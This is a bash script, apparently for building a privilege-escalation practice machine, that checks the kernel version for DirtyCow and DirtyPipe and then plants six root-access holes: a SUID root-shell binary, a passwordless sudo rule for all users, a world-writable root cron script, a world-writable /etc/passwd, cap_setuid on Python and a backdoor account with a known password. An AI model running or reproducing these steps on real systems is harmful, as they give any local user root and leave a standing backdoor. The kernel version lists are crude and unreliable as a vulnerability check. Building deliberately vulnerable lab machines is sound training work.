#!/bin/bash

# Privilege Escalation Auto-Config Script
# Checks for DirtyPipe/DirtyCow, then adds other escalation vectors

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Check if root
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[!] Run as root!${NC}"
    exit 1
fi

# Kernel version check
kernel_version=$(uname -r | cut -d '.' -f 1-3)
echo -e "${YELLOW}[*] Kernel version: $kernel_version${NC}"

# DirtyCow Check (CVE-2016-5195)
dirtycow_vuln_versions=(
    "2.6.22" "2.6.23" "2.6.24" "2.6.25" "2.6.26" "2.6.27" "2.6.28" 
    "2.6.29" "2.6.30" "2.6.31" "2.6.32" "2.6.33" "2.6.34" "2.6.35"
    "2.6.36" "2.6.37" "2.6.38" "2.6.39" "3.0.0" "3.1.0" "3.2.0" 
    "3.3.0" "3.4.0" "3.5.0" "3.6.0" "3.7.0" "3.8.0" "3.9.0" "3.10.0" 
    "3.11.0" "3.12.0" "3.13.0" "3.14.0" "3.15.0" "3.16.0" "3.17.0" 
    "3.18.0" "3.19.0" "4.0.0" "4.1.0" "4.2.0" "4.3.0" "4.4.0"
)

# DirtyPipe Check (CVE-2022-0847)
dirtypipe_vuln_versions=(
    "5.8.0" "5.9.0" "5.10.0" "5.11.0" "5.12.0" "5.13.0" "5.14.0" 
    "5.15.0" "5.16.0" "5.16.11"
)

# Check vulnerabilities
dirtycow_present=0
dirtypipe_present=0

for version in "${dirtycow_vuln_versions[@]}"; do
    if [[ "$kernel_version" == "$version"* ]]; then
        dirtycow_present=1
        break
    fi
done

for version in "${dirtypipe_vuln_versions[@]}"; do
    if [[ "$kernel_version" == "$version"* ]]; then
        dirtypipe_present=1
        break
    fi
done

# Results
echo -e "\n${YELLOW}[*] Vulnerability Check Results:${NC}"
echo -e "DirtyCow (CVE-2016-5195): $([ $dirtycow_present -eq 1 ] && echo -e "${GREEN}VULNERABLE${NC}" || echo -e "${RED}NOT VULNERABLE${NC}")"
echo -e "DirtyPipe (CVE-2022-0847): $([ $dirtypipe_present -eq 1 ] && echo -e "${GREEN}VULNERABLE${NC}" || echo -e "${RED}NOT VULNERABLE${NC}")"

# If neither is present, ask to continue
if [[ $dirtycow_present -eq 0 && $dirtypipe_present -eq 0 ]]; then
    echo -e "\n${YELLOW}[!] Neither DirtyCow nor DirtyPipe is exploitable on this kernel.${NC}"
    read -p "Do you want to implement other privilege escalation methods? (y/n) " choice
    case "$choice" in
        y|Y ) echo -e "${GREEN}[+] Proceeding with other methods...${NC}";;
        * ) echo -e "${RED}[!] Exiting.${NC}"; exit 0;;
    esac
fi

# =============================================
# Implement Privilege Escalation Vectors
# =============================================

echo -e "\n${YELLOW}[*] Configuring Privilege Escalation Vectors${NC}"

# 1. SUID Binaries
echo -e "\n${GREEN}[+] Creating vulnerable SUID binary${NC}"
cat << 'EOF' > /tmp/suid.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() { 
    setuid(0); 
    setgid(0); 
    system("/bin/bash"); 
    return 0; 
}
EOF
gcc /tmp/suid.c -o /usr/bin/suid-wrapper
chmod 4755 /usr/bin/suid-wrapper
rm /tmp/suid.c
echo -e "Created: ${GREEN}/usr/bin/suid-wrapper${NC} (SUID root)"

# 2. Sudo Misconfiguration
echo -e "\n${GREEN}[+] Adding sudo misconfiguration${NC}"
echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo -e "Added: ${GREEN}NOPASSWD ALL${NC} to /etc/sudoers"

# 3. Cron Job
echo -e "\n${GREEN}[+] Creating vulnerable cron job${NC}"
echo "* * * * * root /opt/backup.sh" > /etc/cron.d/backup
touch /opt/backup.sh
chmod 777 /opt/backup.sh
echo -e "Created: ${GREEN}/etc/cron.d/backup${NC} (world-writable)"

# 4. World-Writable /etc/passwd
echo -e "\n${GREEN}[+] Making /etc/passwd world-writable${NC}"
chmod 666 /etc/passwd
echo -e "Modified: ${GREEN}/etc/passwd${NC} permissions"

# 5. Capabilities
echo -e "\n${GREEN}[+] Setting dangerous capabilities${NC}"
setcap cap_setuid+ep /usr/bin/python3.8
echo -e "Added: ${GREEN}cap_setuid${NC} to Python"

# 6. SSH Backdoor
echo -e "\n${GREEN}[+] Creating SSH backdoor${NC}"
useradd -m -s /bin/bash hacker
echo "hacker:password123" | chpasswd
echo -e "Created user: ${GREEN}hacker:password123${NC}"

# Final Notes
echo -e "\n${YELLOW}[*] Privilege Escalation Vectors Configured:${NC}"
echo -e "1. SUID Binary: ${GREEN}/usr/bin/suid-wrapper${NC}"
echo -e "2. Sudo: ${GREEN}NOPASSWD ALL${NC}"
echo -e "3. Cron: ${GREEN}/etc/cron.d/backup${NC}"
echo -e "4. /etc/passwd: ${GREEN}world-writable${NC}"
echo -e "5. Capabilities: ${GREEN}python3.8 with cap_setuid${NC}"
echo -e "6. SSH: ${GREEN}hacker:password123${NC}"

echo -e "\n${GREEN}[+] Done! Use these for privilege escalation practice.${NC}"